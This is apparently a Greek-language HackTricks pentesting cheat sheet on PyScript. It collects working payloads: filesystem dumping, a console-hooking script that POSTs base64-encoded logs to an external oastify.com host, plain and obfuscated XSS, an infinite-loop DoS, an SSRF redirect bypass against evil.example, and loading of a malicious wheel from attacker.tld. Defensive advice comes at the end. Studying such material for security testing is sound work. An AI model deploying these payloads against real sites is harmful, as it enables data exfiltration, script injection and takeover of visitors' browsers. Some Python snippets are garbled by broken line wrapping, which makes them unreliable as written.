# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Οδηγός Pentesting του PyScript

Το PyScript είναι ένα νέο framework που αναπτύχθηκε για την ενσωμάτωση της Python σε HTML, ώστε να μπορεί να χρησιμοποιείται παράλληλα με HTML. Σε αυτό το cheat sheet θα βρείτε πώς να χρησιμοποιείτε το PyScript για τους σκοπούς του penetration testing.

### Dumping / Ανάκτηση αρχείων από το virtual memory filesystem του Emscripten:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Result:

![Οδηγός PyScript για Pentesting - Dumping / Ανάκτηση αρχείων από το εικονικό σύστημα αρχείων μνήμης του Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration του εικονικού συστήματος αρχείων μνήμης του Emscripten (παρακολούθηση console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Κώδικας:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Αποτέλεσμα:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Συνηθισμένο)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Αποτέλεσμα:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Κώδικας:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Αποτέλεσμα:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Κώδικας:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Αποτέλεσμα:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

Κώδικας:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Αποτέλεσμα:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Νέες ευπάθειες και τεχνικές (2023-2025)

### Server-Side Request Forgery μέσω ανεξέλεγκτων ανακατευθύνσεων (CVE-2025-50182)

Το `urllib3 < 2.5.0` αγνοεί τις παραμέτρους `redirect` και `retries` όταν εκτελείται **μέσα στο Pyodide runtime** που συνοδεύει το PyScript. Όταν ένας attacker μπορεί να επηρεάσει τα target URLs, μπορεί να εξαναγκάσει τον κώδικα Python να ακολουθήσει ανακατευθύνσεις μεταξύ domains, ακόμη και όταν ο developer τις έχει απενεργοποιήσει ρητά — παρακάμπτοντας ουσιαστικά τη λογική προστασίας από anti-SSRF.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Διορθώθηκε στο `urllib3 2.5.0` – αναβαθμίστε το package στο PyScript image σας ή ορίστε μια ασφαλή έκδοση στο `packages = ["urllib3>=2.5.0"]`. Δείτε την επίσημη καταχώριση CVE για λεπτομέρειες.

### Αυθαίρετη φόρτωση packages και επιθέσεις supply-chain

Εφόσον το PyScript επιτρέπει αυθαίρετα URLs στη λίστα `packages`, ένας κακόβουλος actor που μπορεί να τροποποιήσει ή να εισαγάγει configuration μπορεί να εκτελέσει **πλήρως αυθαίρετο Python** στον browser του θύματος:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Απαιτούνται μόνο pure-Python wheels — δεν χρειάζεται βήμα compilation του WebAssembly.* Βεβαιωθείτε ότι η configuration δεν ελέγχεται από τον χρήστη και φιλοξενείτε trusted wheels στο δικό σας domain με HTTPS και SRI hashes.

### Αλλαγές στο output sanitisation (2023+)

* Η `print()` εξακολουθεί να εισάγει raw HTML και επομένως είναι ευάλωτη σε XSS (παραδείγματα παραπάνω).
* Το νεότερο `display()` helper κάνει **escape του HTML από προεπιλογή** — το raw markup πρέπει να περικλείεται σε `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Αυτή η συμπεριφορά εισήχθη το 2023 και τεκμηριώνεται στον επίσημο οδηγό Built-ins. Βασιστείτε στη `display()` για μη αξιόπιστα δεδομένα εισόδου και αποφύγετε την απευθείας κλήση της `print()`.<sup>[[2]](#references)</sup>

---

## Βέλτιστες πρακτικές άμυνας

* **Διατηρείτε τα packages ενημερωμένα** – αναβαθμίστε σε `urllib3 >= 2.5.0` και εκτελείτε τακτικά rebuild των wheels που συνοδεύουν το site.
* **Περιορίστε τις πηγές packages** – αναφέρετε μόνο ονόματα PyPI ή URLs ίδιας προέλευσης, ιδανικά προστατευμένα με Sub-resource Integrity (SRI).
* **Ενισχύστε το Content Security Policy** – απαγορεύστε την ενσωματωμένη JavaScript (`script-src 'self' 'sha256-…'`), ώστε τα injected blocks `<script>` να μην μπορούν να εκτελεστούν.
* **Απαγορεύστε tags `<py-script>` / `<script type="py">` που παρέχονται από τους χρήστες** – κάντε sanitise στο HTML στον server πριν το επιστρέψετε σε άλλους χρήστες.
* **Απομονώστε τους workers** – αν δεν χρειάζεστε σύγχρονη πρόσβαση στο DOM από workers, ενεργοποιήστε το flag `sync_main_only` για να αποφύγετε τις απαιτήσεις headers του `SharedArrayBuffer`.

## Αναφορές

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Τεκμηρίωση PyScript Built-ins – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
